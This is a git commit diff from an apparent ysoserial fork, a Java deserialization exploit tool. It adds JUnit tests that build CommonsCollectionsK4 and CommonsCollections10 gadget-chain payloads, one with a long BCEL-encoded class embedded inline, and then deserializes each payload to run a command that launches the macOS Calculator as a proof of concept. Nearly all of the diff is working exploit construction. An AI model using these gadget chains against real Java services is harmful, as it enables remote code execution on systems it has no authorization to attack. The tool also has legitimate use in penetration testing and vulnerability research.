90824d4781f71db614232c20de3fe407894519a5
c0ny1 <1627639645@qq.com>
2021-05-25 01:54:56 +0800

    给CommonsCollections4系列gadget添加bcel_with_args和bcel_class_file_with_args命令

--- src/test/java/me/gv7/woodpecker/yso/payloads/custom/BcelWithArgsTest.java
+++ src/test/java/me/gv7/woodpecker/yso/payloads/custom/BcelWithArgsTest.java
@@ -2,11 +2,10 @@ package me.gv7.woodpecker.yso.payloads.custom;
 
 import me.gv7.woodpecker.yso.Deserializer;
 import me.gv7.woodpecker.yso.Serializer;
-import me.gv7.woodpecker.yso.payloads.CommonsCollections10;
-import me.gv7.woodpecker.yso.payloads.CommonsCollections6;
+import me.gv7.woodpecker.yso.payloads.*;
 import org.junit.Test;
 
-public class TemplatesImplUtilTest {
+public class BcelWithArgsTest {
 
     @Test
     public void getCmdForBcelWithArg01() throws Exception{
@@ -23,6 +22,13 @@ public class TemplatesImplUtilTest {
     }
 
     @Test
+    public void getCmdForBcelWithArg03() throws Exception{
+        CommonsCollectionsK4 k4 = new CommonsCollectionsK4();
+        Object exp = k4.getObject("bcel_with_args:$$BCEL$$$l$8b$I$A$A$A$A$A$A$Au$91$dfN$db0$U$c6$3f$f7_$d2$d0A$v$94$c1$Y$a5l7a$TX$bb$ee$d4iT$m$nu$U$z$TS$b5$x7$b3$3a$a3$d4$89$S$X$c1cq$c3$Q$d2$f6$A$7b$u$b4$e3$K$95$b2$81$z$d9$fa$3e$9f$f3$3b$3e$f6$9f$db$9b$df$A$de$e1$b5$872$96$3c$y$a3$ee$60$c5$c5s$X$ab$$$d6$ac$f1$c2$c1$ba$83$97$M$a5$f7J$x$d3f$c8$fb$db$t$M$85N$fc$5d2$yt$95$96G$e3$d1$40$a6_$c4$m$o$c7$db$3f$PebT$ac3$H$h$Mu$bf$7b$w$ce$E$8f$84$k$f2$c0$a4J$P$5b$W$e0$F$f18$N$e5$81$b2I$e5$8e$88$c2$5d$hW$81$879$H$8d$K6$d1d$a8$fe$9b$cb$e0$f0$81$d2$3c$fb$c1$90$db$J$Z$f6$e2D$ea$s$P$$2$pG$fcc$92D$w$U$93$f2$dcB$c7$910q$ba$x$92$84wbm$a46$Z$ff$q$c2$5e0sZ$c1$W$5e$d9$96$c8yP$b278$95$a1aX$9aX$w$e6$87$bdiw$M$8b$f7$81$9f$c7$da$a8$91$ed$7e$u$cdT$d4$fd$ed$ee$7f1$z$w$q$cf$r$V$f2$fdo$8f$3c$cd$8cu$9c$c6$a1$cc$b2$W$5d$cf$a5$P$b2$p$Hf$l$88$f6$K$a9$P$u$92$G6$df$fc$E$bbF$ae$f4$L$f9$7e$beV$I$fa$85Z1$e8$Xk$a5$e0$K$ce$d7K$KaxF$eb$3c$f2$b4$Wh$W$d1$40$89$b4U$f4$8d$Tl$f5$O$db$a6$d3$i$ed$8d$t$b0o$l$a5$baD$wc$838$b3$d4$c5$c9$a5k$7f$B$96Y$b4$96k$C$A$A|open /System/Applications/Calculator.app/Contents/MacOS/Calculator");
+        Deserializer.deserialize(Serializer.serialize(exp));
+    }
+
+    @Test
     public void getCmdForBcelClassFileWithArg01() throws Exception{
         CommonsCollections10 cc10 = new CommonsCollections10();
         Object exp = cc10.getObject("bcel_class_file_with_args:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.class|open /System/Applications/Calculator.app/Contents/MacOS/Calculator");
@@ -33,6 +39,13 @@ public class TemplatesImplUtilTest {
     public void getCmdForBcelClassFileWithArg02() throws Exception{
         CommonsCollections10 cc6 = new CommonsCollections10();
         Object exp = cc6.getObject("bcel_class_file_with_args:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.class|open /System/Applications/Calculator.app/Contents/MacOS/Calculator");
+        Deserializer.deserialize(Serializer.serialize(exp));
+    }
+
+    @Test
+    public void getCmdForBcelClassFileWithArg03() throws Exception{
+        CommonsCollectionsK4 k4 = new CommonsCollectionsK4();
+        Object exp = k4.getObject("bcel_class_file_with_args:/Users/c0ny1/Documents/codebak/ysoserial-for-woodpecker/src/test/java/Calc.class|open /System/Applications/Calculator.app/Contents/MacOS/Calculator");
         Deserializer.deserialize(Serializer.serialize(exp));
     }
 }
